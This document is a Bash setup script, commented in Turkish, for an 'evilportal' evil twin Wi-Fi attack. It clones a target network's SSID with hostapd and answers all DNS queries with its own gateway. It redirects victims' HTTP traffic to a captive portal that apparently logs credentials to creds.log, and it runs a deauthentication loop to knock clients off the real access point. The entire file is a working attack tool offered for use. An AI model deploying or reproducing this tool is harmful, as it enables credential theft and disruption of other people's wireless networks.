#!/usr/bin/env bash
# ==============================================================
#  evilportal — evil twin + captive portal
#  Kullanım:  sudo ./setup.sh
#  Durdurmak: Ctrl+C  (temizlik otomatik yapılır)
# ==============================================================
set -uo pipefail

BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$BASE/config.sh"

RUN="$BASE/run"
LOGS="$BASE/logs"
CAP="$BASE/capture"
mkdir -p "$RUN" "$LOGS" "$CAP"

G="\033[1;32m"; Y="\033[1;33m"; R="\033[1;31m"; N="\033[0m"
log()  { echo -e "${G}[+]${N} $*"; }
warn() { echo -e "${Y}[!]${N} $*"; }
die()  { echo -e "${R}[-]${N} $*" >&2; exit 1; }

[[ $EUID -eq 0 ]] || die "root gerekli: sudo $0"

[[ "$TARGET_BSSID" == "AA:BB:CC:DD:EE:FF" ]] && \
  warn "TARGET_BSSID hâlâ örnek değer — önce ./scan.sh ile hedefi bul, config.sh'i düzenle"

# ---------- bağımlılıklar -------------------------------------
for b in hostapd dnsmasq iptables iw aireplay-ng python3 ipset; do
  command -v "$b" >/dev/null 2>&1 || \
    die "'$b' eksik — sudo apt install hostapd dnsmasq iptables iw aircrack-ng python3 ipset"
done
python3 -c 'import flask' 2>/dev/null || die "flask eksik — pip3 install flask --break-system-packages"

# ---------- uplink tespiti (NM ölmeden önce) ------------------
if [[ -z "$UPLINK_IF" ]]; then
  UPLINK_IF=$(ip -4 route show default 2>/dev/null | \
    awk '{for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1); exit}}')
fi
[[ -n "$UPLINK_IF" ]] && log "Uplink: $UPLINK_IF" || warn "Uplink bulunamadı — internet paylaşımı kapalı"
[[ "$SHARE_INTERNET" == "1" && -z "$UPLINK_IF" ]] && SHARE_INTERNET=0

# ---------- kanal modu ----------------------------------------
if (( CHANNEL > 14 )); then
  HW_MODE="a"; N_MODE=""
else
  HW_MODE="g"; N_MODE="ieee80211n=1"
fi

# ---------- cleanup -------------------------------------------
CLEANED=0
cleanup() {
  [[ "$CLEANED" == "1" ]] && return
  CLEANED=1
  echo
  warn "Kapatılıyor…"
  [[ -n "${DEAUTH_PID:-}" ]] && kill "$DEAUTH_PID" 2>/dev/null
  [[ -n "${PORTAL_PID:-}" ]] && kill "$PORTAL_PID" 2>/dev/null
  pkill -x dnsmasq 2>/dev/null
  pkill -x hostapd 2>/dev/null
  iptables -t nat -F 2>/dev/null
  iptables -F FORWARD 2>/dev/null
  ipset destroy portal_auth 2>/dev/null
  sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1
  ip addr flush dev "$AP_IF" 2>/dev/null
  ip link set "$AP_IF" down 2>/dev/null
  [[ "${SINGLE_ADAPTER}" == "1" ]] && iw dev "$MON_VIF" del 2>/dev/null
  systemctl restart NetworkManager >/dev/null 2>&1
  log "Temiz."
}
trap cleanup EXIT INT TERM

# ---------- 1. eski süreçler -----------------------------------
log "Eski süreçler durduruluyor"
airmon-ng check kill >/dev/null 2>&1 || true
pkill -x hostapd 2>/dev/null || true
pkill -x dnsmasq 2>/dev/null || true
sleep 1

# ---------- 2. monitor arayüzü ---------------------------------
if [[ "$SINGLE_ADAPTER" == "1" ]]; then
  log "Tek adaptör modu — sanal monitor vif: $MON_VIF"
  iw dev "$MON_VIF" del 2>/dev/null
  ip link set "$AP_IF" down 2>/dev/null
  iw dev "$AP_IF" interface add "$MON_VIF" type monitor
  MON_IF="$MON_VIF"
fi

log "Monitor modu: $MON_IF"
ip link set "$MON_IF" down 2>/dev/null
iw dev "$MON_IF" set type monitor 2>/dev/null
ip link set "$MON_IF" up
iw dev "$MON_IF" set channel "$CHANNEL" || die "Kanal $CHANNEL ayarlanamadı"
iw dev "$MON_IF" set power_save off 2>/dev/null || true

# ---------- 3. AP arayüzü --------------------------------------
log "AP arayüzü: $AP_IF → $GATEWAY_IP/$SUBNET_MASK"
ip link set "$AP_IF" down 2>/dev/null
ip addr flush dev "$AP_IF" 2>/dev/null
ip addr add "$GATEWAY_IP/$SUBNET_MASK" dev "$AP_IF"
ip link set "$AP_IF" up

# ---------- 4. hostapd -----------------------------------------
cat > "$RUN/hostapd.conf" <<EOF
interface=$AP_IF
driver=nl80211
ctrl_interface=$RUN/hostapd
ssid=$TARGET_SSID
hw_mode=$HW_MODE
channel=$CHANNEL
$N_MODE
wmm_enabled=1
auth_algs=1
ignore_broadcast_ssid=0
macaddr_acl=0
country_code=TR
EOF

if [[ -n "$WPA_PASS" ]]; then
  cat >> "$RUN/hostapd.conf" <<EOF
wpa=2
wpa_passphrase=$WPA_PASS
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
  log "Sahte AP başlatılıyor: SSID=$TARGET_SSID kanal=$CHANNEL (WPA2)"
else
  log "Sahte AP başlatılıyor: SSID=$TARGET_SSID kanal=$CHANNEL (open)"
fi

hostapd -B -P "$RUN/hostapd.pid" "$RUN/hostapd.conf" > "$LOGS/hostapd.log" 2>&1
sleep 2
kill -0 "$(cat "$RUN/hostapd.pid" 2>/dev/null)" 2>/dev/null || \
  die "hostapd başlatılamadı — logs/hostapd.log"

# ---------- 5. dnsmasq -----------------------------------------
cat > "$RUN/dnsmasq.conf" <<EOF
interface=$AP_IF
bind-interfaces
dhcp-range=$DHCP_START,$DHCP_END,$DHCP_LEASE
dhcp-option=3,$GATEWAY_IP
dhcp-option=6,$GATEWAY_IP
address=/#/$GATEWAY_IP
no-resolv
no-hosts
log-queries
log-dhcp
dhcp-authoritative
EOF

log "DHCP + wildcard DNS başlatılıyor"
dnsmasq -C "$RUN/dnsmasq.conf" -x "$RUN/dnsmasq.pid" > "$LOGS/dnsmasq.log" 2>&1
sleep 1
kill -0 "$(cat "$RUN/dnsmasq.pid" 2>/dev/null)" 2>/dev/null || \
  die "dnsmasq başlatılamadı — logs/dnsmasq.log"

# ---------- 6. ipset + iptables --------------------------------
log "iptables / ipset kuralları"
ipset create portal_auth hash:mac -exist
ipset flush portal_auth

sysctl -w net.ipv4.ip_forward=1 >/dev/null

iptables -t nat -F
iptables -F FORWARD

# HTTP → portal (yalnızca henüz doğrulanmamış MAC'ler)
iptables -t nat -A PREROUTING -i "$AP_IF" -p tcp --dport 80 \
  -m set ! --match-set portal_auth src \
  -j DNAT --to-destination "$GATEWAY_IP:$PORTAL_PORT"

# HTTPS'i reddet (portal dışına çıkış yok)
iptables -A FORWARD -i "$AP_IF" -p tcp --dport 443 \
  -m set ! --match-set portal_auth src \
  -j REJECT --reject-with tcp-reset

if [[ "$SHARE_INTERNET" == "1" ]]; then
  iptables -t nat -A POSTROUTING -o "$UPLINK_IF" -j MASQUERADE
  log "İnternet paylaşımı: $AP_IF → $UPLINK_IF"
fi

iptables -A FORWARD -i "$AP_IF" -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A FORWARD -o "$AP_IF" -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A FORWARD -i "$AP_IF" -m set --match-set portal_auth src -j ACCEPT
iptables -A FORWARD -i "$AP_IF" -j DROP

# ---------- 7. portal -----------------------------------------
log "Portal başlatılıyor: http://$GATEWAY_IP:$PORTAL_PORT/"
python3 "$BASE/portal/app.py" > "$LOGS/portal.log" 2>&1 &
PORTAL_PID=$!
sleep 2
kill -0 "$PORTAL_PID" 2>/dev/null || die "portal başlatılamadı — logs/portal.log"

# ---------- 8. deauth -----------------------------------------
log "Deauth döngüsü başlatılıyor: $TARGET_BSSID"
"$BASE/deauth.sh" "$MON_IF" > "$LOGS/deauth.log" 2>&1 &
DEAUTH_PID=$!

echo
echo -e "${G}==============================================${N}"
echo -e "  SSID     : $TARGET_SSID"
echo -e "  Kanal    : $CHANNEL"
echo -e "  Portal   : http://$GATEWAY_IP/"
echo -e "  Kayıtlar : $CAP/creds.log"
echo -e "  İzle     : python3 $BASE/show.py -f"
echo -e "${G}==============================================${N}"
echo -e "  Durdurmak için ${Y}Ctrl+C${N}"
echo

wait "$PORTAL_PID"
